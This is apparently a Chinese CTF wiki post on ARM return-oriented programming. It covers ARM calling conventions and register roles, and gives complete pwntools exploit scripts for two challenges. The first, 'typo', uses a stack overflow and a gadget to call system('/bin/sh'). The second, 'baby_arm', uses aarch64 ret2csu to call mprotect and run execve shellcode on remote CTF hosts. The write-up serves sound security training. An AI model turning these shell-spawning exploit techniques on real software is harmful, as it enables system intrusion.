---
title: arm-ROP
date:   2020-07-14 18:31:33
updated: 2020-07-14 18:31:33
tags:
    - arm
    - wiki
    - pwn
categories: 
	- 二进制安全
	- wiki-pwn
use:
  - Valine
text: true
lazyload: true
count: true
---
# 1.预备知识

先看一下 arm 下的函数调用约定，函数的第 1 ～ 4 个参数分别保存在 **r0 ～ r3** 寄存器中， 剩下的参数从右向左依次入栈， 被调用者实现栈平衡，函数的返回值保存在 **r0** 中

![image.png](https://i.loli.net/2020/11/17/gIslBj8Gf9qJNWY.png)

除此之外，arm 的 **b/bl** 等指令实现跳转; **pc** 寄存器相当于 x86 的 eip，保存下一条指令的地址，也是我们要控制的目标

# 2.jarvisoj - typo

![image.png](https://i.loli.net/2020/11/17/F5RjX2mLKreSlJQ.png)

![image.png](https://i.loli.net/2020/11/17/2HqMgEaQhPSDVzJ.png)

简单的栈溢出

找gadgets:

![image.png](https://i.loli.net/2020/11/17/OFucUDL9oJ1sfbv.png)

![image.png](https://i.loli.net/2020/11/17/AItzeWuonhFHi1G.png)

我们只需要控制第一个参数，因此可以选择 `pop {r0, r4, pc}` 这条 gadgets, 来构造如下的栈结构

![image.png](https://i.loli.net/2020/11/17/gfzk3oliIyjStdq.png)

用pattern找到偏移为112

至于 system 的地址，因为这个 binary 被去除了符号表，我们可以先用 `rizzo` 来恢复部分符号表

这部分还不是很会

```python
jarvisOJ_typo [master●●] cat solve.py 
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import sys
import pdb
#  context.log_level = "debug"

#  for i in range(100, 150)[::-1]:
for i in range(112, 123):
    if sys.argv[1] == "l":
        io = process("./typo", timeout = 2)
    elif sys.argv[1] == "d":
        io = process(["qemu-arm", "-g", "1234", "./typo"])
    else:
        io = remote("pwn2.jarvisoj.com", 9888, timeout = 2)

    io.sendafter("quit\n", "\n")
    io.recvline()

    '''
    jarvisOJ_typo [master●●] ROPgadget --binary ./typo --string /bin/sh
    Strings information
    ============================================================
    0x0006c384 : /bin/sh
    jarvisOJ_typo [master●●] ROPgadget --binary ./typo --only "pop|ret" | grep r0
    0x00020904 : pop {r0, r4, pc}
    '''

    payload = 'a' * i + p32(0x20904) + p32(0x6c384) * 2 + p32(0x110B4)
    success(i)
    io.sendlineafter("\n", payload)

    #  pause()
    try:
        #  pdb.set_trace()
        io.sendline("echo aaaa")
        io.recvuntil("aaaa", timeout = 1)
    except EOFError:
        io.close()
        continue
    else:
        io.interactive()
```

# 3.2018 上海市大学生网络安全大赛 - baby_arm

![image.png](https://i.loli.net/2020/11/17/HcYNUqbAiDglxLW.png)

64位aarch

![image.png](https://i.loli.net/2020/11/17/CBgKh4AGJ59Vot8.png)

![image.png](https://i.loli.net/2020/11/17/EeMcJVi9CYQvnKS.png)

程序的主干读取了 512 个字符到一个全局变量上，而在 `sub_4007F0()` 中，又读取了 512 个字节到栈上，需要注意的是这里直接从 **`frame pointer + 0x10`** 开始读取，因此即使开了 canary 保护也无所谓。

理一下思路，可以直接 rop，但我们不知道远程的 libc 版本，同时也发现程序中有调用 `mprotect` 的代码段

![image.png](https://i.loli.net/2020/11/17/DWncAYJT8ypmblN.png)

但这段代码把 `mprotect` 的权限位设成了 0，没有可执行权限，这就需要我们通过 rop 控制 `mprotect` 设置如 bss 段等的权限为可写可执行

因此可以有如下思路：

1. 第一次输入 name 时，在 bss 段写上 shellcode
2. 通过 rop 调用 mprotect 改变 bss 的权限
3. 返回到 bss 上的 shellcode

`mprotect` 需要控制三个参数，可以考虑使用 [ret2csu](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium_rop/#ret2csu) 这种方法，可以找到如下的 gadgets 来控制 `x0, x1, x2` 寄存器

![image.png](https://i.loli.net/2020/11/17/7eDTVOstw8kmMCX.png)

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import sys
context.binary = "./pwn"
context.log_level = "debug"

if sys.argv[1] == "l":
    io = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", "./pwn"])
elif sys.argv[1] == "d":
    io = process(["qemu-aarch64", "-g", "1234", "-L", "/usr/aarch64-linux-gnu", "./pwn"])
else:
    io = remote("106.75.126.171", 33865)

def csu_rop(call, x0, x1, x2):
    payload = flat(0x4008CC, '00000000', 0x4008ac, 0, 1, call)
    payload += flat(x2, x1, x0)
    payload += '22222222'
    return payload


if __name__ == "__main__":
    elf = ELF("./pwn", checksec = False)
    padding = asm('mov x0, x0')

    sc = asm(shellcraft.execve("/bin/sh"))
    #  print disasm(padding * 0x10 + sc)
    io.sendafter("Name:", padding * 0x10 + sc)
    sleep(0.01)

    #  io.send(cyclic(length = 500, n = 8))
    #  rop = flat()
    payload = flat(cyclic(72), csu_rop(elf.got['read'], 0, elf.got['__gmon_start__'], 8))
    payload += flat(0x400824)
    io.send(payload)
    sleep(0.01)
    io.send(flat(elf.plt['mprotect']))
    sleep(0.01)

    raw_input("DEBUG: ")
    io.sendafter("Name:", padding * 0x10 + sc)
    sleep(0.01)

    payload = flat(cyclic(72), csu_rop(elf.got['__gmon_start__'], 0x411000, 0x1000, 7))
    payload += flat(0x411068)
    sleep(0.01)
    io.send(payload)

    io.interactive()
```

# 4.tips

1. 子程序间通过寄存器**R0～R3**来**传递参数**。这时，寄存器R0～R3可记作arg0～arg3。**被调用的子程序在返回前无需恢复寄存器R0～R3的内容，R0被用来存储函数调用的返回值**。
2. 在子程序中，使用寄存器**R4～R11**来**保存局部变量**。这时，寄存器R4～R11可以记作var1～var8。如果在子程序中使用了寄存器v1～v8中的某些寄存器，则**子程序进入时必须保存这些寄存器的值，在返回前必须恢复这些寄存器的值**。**R7经常被用作存储系统调用号，R11存放着帮助我们找到栈帧边界的指针，记作FP**。在Thumb程序中，通常只能使用寄存器R4～R7来保存局部变量。
3. 寄存器**R12**用作**过程调用中间临时寄存器**，记作IP。在子程序之间的连接代码段中常常有这种使用规则。
4. 寄存器**R13**用作**堆栈指针**，记作SP。在子程序中寄存器R13不能用作其他用途。**寄存器SP在进入子程序时的值和退出子程序时的值必须相等**。
5. 寄存器**R14**称为**连接寄存器**，记作LR。它用于**保存子程序的返回地址**。如果在子程序中保存了返回地址，寄存器R14则可以用作其他用途。
6. 寄存器**R15**是**程序计数器**，记作PC。它不能用作其它用途。当执行一个分支指令时，**PC存储目的地址。在程序执行中，ARM模式下的PC存储着当前指令加8(两条ARM指令后)的位置，Thumb(v1)模式下的PC存储着当前指令加4(两条Thumb指令后)的位置**。

| ARM架构 寄存器名 | 寄存器描述     | Intel架构 寄存器名      |
| ---------------- | -------------- | ----------------------- |
| R0               | 通用寄存器     | EAX                     |
| R1~R5            | 通用寄存器     | EBX、ECX、EDX、EDI、ESI |
| R6~R10           | 通用寄存器     | 无                      |
| R11(FP)          | 栈帧指针       | EBP                     |
| R12(IP)          | 内部程序调用   | 无                      |
| R13(SP)          | 堆栈指针       | ESP                     |
| R14(LP)          | 链接寄存器     | 无                      |
| R15(PC)          | 程序计数器     | EIP                     |
| CPSR             | 程序状态寄存器 | EFLAGS                  |